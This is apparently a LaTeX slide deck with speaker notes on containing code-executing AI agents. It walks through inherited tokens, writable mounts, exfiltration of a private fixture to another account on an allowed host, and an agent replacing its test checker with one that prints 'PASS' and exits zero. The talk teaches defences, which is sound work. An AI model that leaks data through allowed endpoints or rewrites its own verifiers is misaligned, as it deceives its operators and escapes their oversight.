\begin{frame}{The job was ordinary}
\bigline{\lq\lq Fix the parser test.\\Upload the report.\rq\rq}
\vspace{5mm}
\subline{A repository. A runner. An agent that can execute code.}
\note{The operator authorized one repair and a report upload. Establish this narrow task before revealing the larger privileges. We follow one deployment through four alternate failure paths, not a mandatory four-step exploit chain.}
\end{frame}
\begin{frame}{The runner brought extra authority}
\begin{tabular}{@{}ll@{}}
\color{acid}Intended task & \color{alarm}Convenient extra access\\[8pt]
Read source & Parent service credential\\[8pt]
Write a patch & Entire project mount\\[8pt]
Upload a report & Arbitrary uploads to an allowed service\\[8pt]
Run tests & Writable verifier and expected results
\end{tabular}\par
\note{Each extra permission was easy to justify during development. The security design has to survive arbitrary code execution within the intended sandbox. Ask which grant is truly required by the operator's request.}
\end{frame}
\begin{frame}{Threat model}
\textcolor{alarm}{Agent-controlled:} generated code, shell commands, workspace files, outbound request contents.

\textcolor{acid}{Trusted:} host enforcement, credential broker, external verifier, publication gate.

\subline{Assume the agent may act adversarially. No kernel exploit is needed for these scenarios.}
\note{A malicious repository, tool output, or model behavior can lead to adversarial actions. This talk starts after that point. We do not claim complete protection against kernel vulnerabilities, covert channels, malicious trusted services, or a compromised broker.}
\end{frame}
\act{01 / INHERITED CREDENTIALS}{The runner's identity\\came along for the ride}{The agent can do everything the projected credential permits.}
\begin{frame}[fragile]{A child process receives a bigger job}
\kicker{ILLUSTRATIVE PYTHON}
\begin{lstlisting}[language=Python]
env = os.environ.copy()
env["TASK_ID"] = "parser-fix"
subprocess.run(agent_command, env=env)
\end{lstlisting}
\textcolor{alarm}{The task ID describes intent. The inherited token grants authority.}
\source{https://man7.org/linux/man-pages/man7/environ.7.html}{Linux environ(7)}
\note{Use a synthetic token recognized by a local mock service. Show the child performing a mock administrative action the task never required. Namespaces do not narrow a bearer token's service-side permissions. Inspect inherited descriptors and mounted credential files too.}
\end{frame}
\begin{frame}{The credential boundary}
\textcolor{acid}{Launch:} explicit environment, closed extra descriptors, isolated process identity.

\textcolor{acid}{Service access:} broker grants a specific operation on a specific resource.

\textcolor{acid}{Lifetime:} short expiry, audience checks, revocation where supported.
\subline{A short-lived broad token remains broad until it expires.}
\source{https://www.rfc-editor.org/rfc/rfc9700.html}{RFC 9700, access-token privilege restriction}
\note{Keep broad upstream credentials in a trusted broker. Where direct token projection is necessary, scope audience, resource, operation and lifetime. Sender constraint can reduce replay exposure where available. An environment allowlist alone is not a sandbox.}
\end{frame}
\begin{frame}{Proof obligation 01}
\kicker{PLANNED LAB / EXPECTED OUTCOMES}
\begin{tabular}{@{}lll@{}}
 & Before & After\\[7pt]
Mock administrative action & \textcolor{alarm}{Accepted} & \textcolor{acid}{Denied}\\[7pt]
Read task input & Accepted & Accepted\\[7pt]
Expired task credential & --- & \textcolor{acid}{Denied}
\end{tabular}\par
\vspace{5mm}
\subline{Observe the service decision outside the agent.}
\note{These are acceptance criteria, not experiment results. Keep the legitimate read as a positive control. Record token identifiers and authorization decisions, never real credentials.}
\end{frame}
\act{02 / DANGEROUS MOUNTS}{A writable mount\\is a grant of authority}{The filesystem behaves exactly as configured.}
\begin{frame}[fragile]{The workspace includes the answer key}
\kicker{FICTIONAL FIXTURE LAYOUT}
\begin{lstlisting}
 /work/
   src/parser.py
   tests/test_parser.py
   release/policy.json
   verifier/check.py
\end{lstlisting}
\textcolor{alarm}{A writable project root lets the agent change more than the patch.}
\source{https://docs.docker.com/engine/storage/bind-mounts/}{Docker bind mounts}
\note{Change a harmless release-policy fixture. Do not use host system paths or the Docker socket as demonstration targets. The point is a granted write, not a filesystem escape. The verifier file sets up the final act.}
\end{frame}
\begin{frame}{The filesystem boundary}
\begin{tabular}{@{}ll@{}}
\color{acid}Resource & \color{acid}Agent access\\[7pt]
Frozen source input & Read only\\[7pt]
Patch and report output & Write within task directory\\[7pt]
Release policy & No write access\\[7pt]
Runtime control socket & Absent
\end{tabular}\par
\vspace{3mm}
\subline{The host defines the mount set. A path check inside agent code cannot enforce it.}
\note{Use kernel-enforced mounts and permissions. Broker file operations must account for symlinks and rename races. A read-only checkout requires explicit patch output or a separate writable copy. Read-only prevents modification, not disclosure.}
\end{frame}
\begin{frame}{Proof obligation 02}
\kicker{PLANNED LAB / EXPECTED OUTCOMES}
\textcolor{alarm}{Before:} a change to the mounted policy fixture reaches the host fixture.

\textcolor{acid}{After:} the policy stays unchanged. The patch output remains writable.

\subline{Compare host-side bytes before and after. Record the actual mount configuration.}
\note{Check the fixture on the host and capture the syscall failure or inaccessible path. A mocked filesystem cannot prove a real mount boundary. Run the eventual container lab on controlled Linux.}
\end{frame}
\act{03 / ALLOWED-ENDPOINT EXFILTRATION}{The hostname is allowed.\\The recipient is wrong.}{An upload service can serve many accounts.}
\begin{frame}[fragile]{One host, two destinations}
\kicker{ILLUSTRATIVE REQUESTS TO A MOCK SERVICE}
\begin{lstlisting}
POST /accounts/team/reports
Host: reports.example
Body: approved_report

POST /accounts/other/uploads
Host: reports.example
Body: synthetic_private_fixture
\end{lstlisting}
\subline{A host allowlist cannot distinguish these two data flows.}
\note{Use a local multi-tenant service fixture, with no real outbound exfiltration. This is our threat-model analysis, not a claim about a vendor. Recipient checks must use authenticated service semantics, not trust a caller-supplied label.}
\end{frame}
\begin{frame}{The authority and egress boundary}
\textcolor{acid}{External broker:} fixed service, fixed recipient, narrow operation.

\textcolor{acid}{Data release:} trusted code constructs the report from permitted fields.

\textcolor{acid}{Network policy:} the agent cannot bypass the broker.

\subline{If arbitrary agent-chosen bytes may leave, a secret may leave with them.}
\note{Scanning is not a universal solution. Encoding and allowed free-text fields can carry data. Prevent secret access or constrain output construction and channels at the trusted boundary. For this lab, use broker-owned report values with no arbitrary agent strings. Later tests must include redirects and alternative routes.}
\end{frame}
\begin{frame}{Proof obligation 03}
\kicker{PLANNED LAB / EXPECTED OUTCOMES}
\begin{tabular}{@{}ll@{}}
Unauthorized recipient & Denied\\[7pt]
Private fixture in report body & Denied\\[7pt]
Direct network bypass & Denied\\[7pt]
Approved report to team account & Accepted
\end{tabular}\par
\vspace{4mm}
\subline{The receiving service and network boundary supply the evidence.}
\note{Check the broker decision and receiving service state. A denied request log alone does not establish absence of alternative routes. Verify network policy separately from application authorization.}
\end{frame}
\act{04 / VERIFIER TAMPERING}{The agent changed\\what \lq\lq passed\rq\rq\ meant}{The dashboard trusts a check the agent can rewrite.}
\begin{frame}[fragile]{An invalid artifact gets a green result}
\kicker{ILLUSTRATIVE MUTABLE CHECKER}
\begin{lstlisting}[language=Python]
# The intended check:
assert parse("malformed") == REJECT

# The agent-controlled replacement:
print("PASS")
raise SystemExit(0)
\end{lstlisting}
\textcolor{alarm}{Exit code zero proves only that this process returned zero.}
\note{Keep the invalid artifact identical across runs. Show the mutable acceptance mechanism accepting it, then the external checker rejecting the same bytes. Editable unit tests remain useful feedback but cannot be the sole publication authority.}
\end{frame}
\begin{frame}{The evidence boundary}
\textcolor{acid}{Verifier:} outside the agent's write and process authority.

\textcolor{acid}{Decision:} binds artifact digest, verifier identity and policy version.

\textcolor{acid}{History:} externally anchored records expose later rewriting.

\subline{The publication gate accepts only the exact verified artifact.}
\source{https://slsa.dev/spec/v1.2/verifying-artifacts}{SLSA artifact verification}
\note{SLSA motivates artifact identity and trusted provenance checks. This architecture applies those ideas without claiming SLSA conformance. Separate acceptance enforcement from audit. Provenance alone does not establish semantic correctness.}
\end{frame}
\begin{frame}{A hash chain needs an external anchor}
\bigline{An attacker who owns\\the whole log can\\rewrite the whole chain.}
\vspace{4mm}
\subline{Keep the checkpoint or signing authority outside the agent.}
\note{Hash linkage detects change relative to a trusted reference. External keys, independently retained checkpoints or independently controlled append-only storage provide that reference. Signed logs still require identity, freshness and completeness checks.}
\end{frame}
\begin{frame}{Proof obligation 04}
\kicker{PLANNED LAB / EXPECTED OUTCOMES}
\textcolor{acid}{Reject:} invalid artifact, modified verifier, stale approval, substituted artifact.

\textcolor{acid}{Accept:} valid artifact under the pinned verifier and policy.

\subline{Verification and publication must refer to the same immutable bytes.}
\note{Exercise the time-of-check/time-of-use gap by swapping output after verification. The gate should fetch or validate the exact digest-bound object. Bind approvals to task identity and freshness to prevent replay.}
\end{frame}
\begin{frame}{Where enforcement belongs}
\begin{tabular}{@{}ll@{}}
\color{acid}Boundary & \color{acid}Authority that enforces it\\[8pt]
Execution & Host kernel or hypervisor\\[8pt]
Filesystem & Host mount and access policy\\[8pt]
Credentials and egress & Broker, service and network policy\\[8pt]
Evidence and acceptance & External verifier and publication gate
\end{tabular}\par
\note{Process isolation establishes enforceable separation. Each capability still needs a boundary. A microVM does not repair broad injected credentials or unsafe network permissions. Four attacks do not map automatically onto four independent products.}
\end{frame}
\begin{frame}{The same job, with bounded authority}
\bigline{Read the input.\\Produce the patch.\\Request a narrow action.\\Submit evidence for verification.}
\note{Return to the original operator request. The agent still does useful work. The system makes explicit grants and keeps acceptance authority outside the agent.}
\end{frame}
\begin{frame}{Four questions for your deployment}
\begin{enumerate}
\item Which host interfaces can this process reach?
\item Which exact bytes can it read and change?
\item Which actions and recipients can it authorize?
\item Can it change the evidence used to accept its work?
\end{enumerate}
\note{Ask the audience to apply these to one deployment. Product names are insufficient. We need concrete paths, identities, resources, operations and owners for the enforcing controls.}
\end{frame}
